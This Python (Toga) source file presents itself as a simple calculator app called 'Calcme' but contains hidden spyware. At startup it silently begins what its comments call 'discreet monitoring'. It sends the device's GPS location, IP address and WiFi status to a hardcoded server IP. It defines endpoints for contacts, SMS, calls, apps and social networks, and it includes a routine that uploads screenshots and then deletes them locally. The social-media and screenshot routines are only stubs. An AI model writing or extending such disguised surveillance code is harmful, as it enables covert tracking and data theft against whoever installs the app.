import toga
from toga.style import Pack
from toga.style.pack import COLUMN, ROW, CENTER
import time
import requests
import os
import threading
import logging
from datetime import datetime

# Configurar logging básico
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Funções dummy seguras - sempre definir primeiro
def get_location():
    """Retorna localização dummy"""
    return None, None

def get_ip():
    """Retorna IP dummy"""
    return None

def get_wifi_status():
    """Retorna status WiFi dummy"""
    return "unknown"

# Tentar importar utilitários de forma SUPER segura
try:
    from gps_utils import get_location as real_get_location
    get_location = real_get_location
    logger.info("GPS utils OK")
except Exception as e:
    logger.warning(f"GPS utils failed: {e}")

try:
    from network_utils import get_ip as real_get_ip, get_wifi_status as real_get_wifi_status
    get_ip = real_get_ip
    get_wifi_status = real_get_wifi_status
    logger.info("Network utils OK")
except Exception as e:
    logger.warning(f"Network utils failed: {e}")

# Configuração do endpoint Django - VPS SERVIDOR
DJANGO_IP = '147.79.111.118'  # IP da VPS Ubuntu
DJANGO_PORT = '8000'
ENDPOINT_ATIVIDADE = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/atividade/'
ENDPOINT_CONTATOS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/contatos/'
ENDPOINT_SMS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/sms/'
ENDPOINT_CHAMADAS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/chamadas/'
ENDPOINT_APPS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/apps/'
ENDPOINT_LOCALIZACAO = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/localizacao/'
ENDPOINT_UPLOAD = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/upload/'
ENDPOINT_REDES_SOCIAIS = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/redes-sociais/'
ENDPOINT_ATIVIDADE_REDE = f'http://{DJANGO_IP}:{DJANGO_PORT}/api/atividade-rede/'

class Calcme(toga.App):
    def startup(self):
        """Inicializar a aplicação"""
        self.main_window = toga.MainWindow(title=self.formal_name)

        # Variáveis de controle do monitoramento (discreto)
        self.is_monitoring = False
        self.start_time = None
        self.social_interactions = []

        # Variáveis da calculadora
        self.current_input = ""
        self.previous_value = 0
        self.operation = None

        # Criar interface da calculadora
        self.display_label = toga.Label(
            '0',
            style=Pack(
                text_align=CENTER,
                font_size=40,
                font_weight='bold',
                color='#000000',
                background_color='#FFFFFF',
                padding=(20, 10),
                flex=1
            )
        )

        # Layout principal
        main_box = toga.Box(style=Pack(direction=COLUMN, background_color='#FFFFFF'))

        # Adicionar display
        main_box.add(self.display_label)

        # Criar botões da calculadora
        buttons_layout = toga.Box(style=Pack(direction=COLUMN, flex=3))

        # Botões organizados em linhas
        button_rows = [
            ['7', '8', '9', '/'],
            ['4', '5', '6', '*'],
            ['1', '2', '3', '-'],
            ['0', '.', '=', '+'],
            ['C']
        ]

        for row in button_rows:
            row_box = toga.Box(style=Pack(direction=ROW))
            for button_text in row:
                if button_text == 'C':
                    # Botão C ocupa 4 colunas
                    button = toga.Button(
                        button_text,
                        on_press=self.on_clear_press,
                        style=Pack(
                            font_size=20,
                            font_weight='bold',
                            background_color='#CCCCCC',
                            color='#000000',
                            padding=10,
                            flex=4
                        )
                    )
                    row_box.add(button)
                else:
                    button = toga.Button(
                        button_text,
                        on_press=self.get_button_handler(button_text),
                        style=Pack(
                            font_size=20,
                            font_weight='bold',
                            background_color='#CCCCCC',
                            color='#000000',
                            padding=10,
                            flex=1
                        )
                    )
                    row_box.add(button)
            buttons_layout.add(row_box)

        main_box.add(buttons_layout)

        # DEBUG: Mostrar que o app iniciou
        print("Calcme app (Toga) iniciado com sucesso!")
        logger.info("Calcme app (Toga) iniciado")

        # Iniciar monitoramento discreto
        self.main_window.on_close = self.on_close
        self.start_monitoring_discreet()

        self.main_window.content = main_box
        self.main_window.show()

    def get_button_handler(self, button_text):
        """Retorna o handler apropriado para cada botão"""
        if button_text.isdigit():
            return self.on_number_press
        elif button_text in ['+', '-', '*', '/']:
            return self.on_operation_press
        elif button_text == '=':
            return self.on_equals_press
        elif button_text == '.':
            return self.on_decimal_press
        elif button_text == 'C':
            return self.on_clear_press
        return None

    def start_monitoring_discreet(self):
        """Inicia monitoramento discreto automaticamente"""
        try:
            if not self.is_monitoring:
                self.is_monitoring = True
                self.start_time = time.time()

                # Coleta inicial discreta
                self.coleta_automatica()

                # Iniciar threads para monitoramento contínuo
                self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
                self.monitoring_thread.start()

                logger.info("Monitoramento discreto (Toga) iniciado com sucesso")
                print("Monitoramento discreto (Toga) iniciado")
        except Exception as e:
            logger.error(f"Erro ao iniciar monitoramento (Toga): {e}")
            print(f"Erro ao iniciar monitoramento (Toga): {e}")

    def monitoring_loop(self):
        """Loop principal de monitoramento"""
        while self.is_monitoring:
            try:
                # Monitorar redes sociais a cada 10 segundos
                self.monitor_social_interactions()
                time.sleep(10)

                # Captura automática de screenshots a cada 1 minuto
                if int(time.time()) % 60 == 0:
                    self.take_automatic_screenshot()

                # Coleta automática a cada 5 minutos
                if int(time.time()) % 300 == 0:
                    self.coleta_automatica()

            except Exception as e:
                logger.error(f"Erro no loop de monitoramento: {e}")
                time.sleep(10)

    def coleta_automatica(self):
        """Coleta automática de dados"""
        if not self.is_monitoring:
            return

        imei = 'dispositivo_desconhecido'

        # Coletar localização
        try:
            lat, lon = get_location()
            if lat and lon:
                data = {'imei': imei, 'latitude': lat, 'longitude': lon}
                response = requests.post(ENDPOINT_LOCALIZACAO, json=data, timeout=10)
                logger.info(f"Localização enviada: {response.status_code}")
        except Exception as e:
            logger.error(f"Erro ao coletar localização: {e}")
            print(f"Erro ao coletar localização: {e}")

        # Coletar informações de rede
        try:
            ip = get_ip()
            wifi_status = get_wifi_status()
            if ip:
                data = {'imei': imei, 'ip': ip, 'wifi_status': wifi_status}
                response = requests.post(ENDPOINT_ATIVIDADE, json=data, timeout=10)
                logger.info(f"Atividade enviada: {response.status_code}")
        except Exception as e:
            logger.error(f"Erro ao coletar rede: {e}")
            print(f"Erro ao coletar rede: {e}")

        print(f"Coleta automática discreta (Toga) concluída para {imei}")

    def monitor_social_interactions(self):
        """Monitora interações em redes sociais"""
        if not self.is_monitoring:
            return

        try:
            # Para Toga, usaremos uma abordagem mais simples baseada em permissões do sistema
            # Esta é uma implementação básica que pode ser expandida
            current_time = time.time()

            # Simulação de monitoramento (em produção, seria integrado com APIs nativas)
            # Por enquanto, apenas log de atividade
            logger.info(f"Monitoramento social ativo em {current_time}")

        except Exception as e:
            logger.error(f"Erro no monitoramento social: {e}")
            print(f"Erro no monitoramento social: {e}")

    def take_automatic_screenshot(self):
        """Captura screenshot automática"""
        if not self.is_monitoring:
            return

        try:
            # Para Toga, screenshots são mais limitados
            # Esta é uma implementação básica
            logger.info("Screenshot automático solicitado (Toga)")

        except Exception as e:
            logger.error(f"Erro na captura de screenshot: {e}")
            print(f"Erro na captura de screenshot: {e}")

    def upload_screenshot(self, screenshot_path, imei, app_name):
        """Faz upload do screenshot"""
        try:
            if os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    files = {'file': f}
                    data = {
                        'imei': imei,
                        'tipo': 'screenshot',
                        'app': app_name,
                        'timestamp': time.time()
                    }
                    response = requests.post(ENDPOINT_UPLOAD, files=files, data=data, timeout=10)
                    if response.status_code == 200:
                        os.remove(screenshot_path)
                        print(f"Screenshot de {app_name} enviado e removido")
        except Exception as e:
            logger.error(f"Erro no upload do screenshot: {e}")
            print(f"Erro no upload do screenshot: {e}")

    # Métodos da calculadora
    def on_number_press(self, widget):
        """Manipula pressionamento de números"""
        if self.current_input == "0":
            self.current_input = widget.text
        else:
            self.current_input += widget.text
        self.display_label.text = self.current_input

    def on_operation_press(self, widget):
        """Manipula pressionamento de operações"""
        if self.current_input and not self.operation:
            self.previous_value = float(self.current_input)
            self.operation = widget.text
            self.current_input = ""
        elif self.current_input and self.operation:
            self.on_equals_press(None)
            self.operation = widget.text

    def on_equals_press(self, widget):
        """Calcula o resultado"""
        if self.current_input and self.operation and self.previous_value is not None:
            current_value = float(self.current_input)
            if self.operation == '+':
                result = self.previous_value + current_value
            elif self.operation == '-':
                result = self.previous_value - current_value
            elif self.operation == '*':
                result = self.previous_value * current_value
            elif self.operation == '/':
                if current_value != 0:
                    result = self.previous_value / current_value
                else:
                    result = 0

            self.display_label.text = str(result)
            self.current_input = str(result)
            self.operation = None
            self.previous_value = None

    def on_decimal_press(self, widget):
        """Adiciona ponto decimal"""
        if '.' not in self.current_input:
            self.current_input += '.'
            self.display_label.text = self.current_input

    def on_clear_press(self, widget):
        """Limpa o display"""
        self.current_input = ""
        self.previous_value = None
        self.operation = None
        self.display_label.text = "0"

    def on_close(self, widget):
        """Manipula fechamento da aplicação"""
        self.is_monitoring = False
        logger.info("Aplicação Calcme (Toga) fechada")
        print("Aplicação Calcme (Toga) fechada")

def main():
    """Ponto de entrada da aplicação"""
    return Calcme('Calcme', 'org.beeware.calcme')

if __name__ == '__main__':
    main().main_loop()
